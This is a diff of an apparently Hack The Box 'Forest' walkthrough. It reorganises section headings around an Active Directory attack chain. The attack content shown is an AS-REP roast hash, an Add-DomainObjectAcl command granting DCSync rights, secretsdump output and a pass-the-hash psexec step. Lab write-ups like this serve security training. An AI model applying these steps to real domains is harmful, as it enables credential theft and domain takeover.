@@ -3,26 +3,14 @@
 ## Table Of Contents:
 <!--ts-->
   * [Enumeration](#enumeration)
-    * [NMAP Scan](#nmap-scan)
-    * [SMB](#smb)
-    * [LDAP](#ldap)
-      * [ldapsearch](#ldapsearch)
-      * [Enum4Linux](#enum4linux)
-      * [windapsearch](#windapsearch)
-    * [RPC](#rpc)
-      * [rpcclient](#rpcclient)
- * [Initial Access](#initial-access)
-   * [WinRM](#winrm)
- * [Active Directory](#active-directory)
-   * [Enumeration](#enumeration)
-     * [BloodHound](#bloodhound)
-       * [Remote](#remote)
-   * [Kerberos](#kerberos)
-     * [ASREPROAST](#asreproast)
-* [Password Cracking](#password-cracking)
-  * [TGT And TGS](#tgt-and-tgs)
-    * [Hashcat](#hashcat)
-    * [John The Ripper](#john-the-ripper)
+  * [Initial Access](#initial-access)
+    * [Password Cracking](#password-cracking)
+    * [FootHold](#evil-winrm)
+  * [Privilege Escalation](#privilege-escalation)
+    * [Remote BloodHound](#remote-bloodhound)
+    * [WriteDacl Abuse](#Exploit-WriteDacl-Permission-Over-HTB.LOCAL)
+    * [DCSync Attack](#dcsync-attack)
+    * [PSExec As Administrator](#psexec-as-administrator)
 <!--te-->
 
 # **Enumeration**
@@ -647,7 +635,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:bd6dc292cf1b334b264e7395fae24749$feb8f3f054
 ```
 Now that we have a TGT for the *svc-alfresco* account, we can attempt to crack the hash!
 
-## Cracking TGT Hash
+## Password Cracking
 
 First lets save the hash to a file:
 ```bash
@@ -866,6 +854,8 @@ Now we need to follow the steps outlined in BloodHound on how to exploit the *Wr
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
 ```
 
+## DCSync Attack
+
 Finally, use *secretsdump.py* from *Impacket* to perform the DCSync
 
 ```bash
@@ -989,7 +979,7 @@ EXCH01$:des-cbc-md5:8c45f44c16975129
 [*] Cleaning up... 
 ```
 
-## Getting Root Flag as Administrator
+## PSExec As Administrator
 
 Now that we have the hash of the *Administrator* we can *psexec* into the Domain Controller and get the root flag!
 
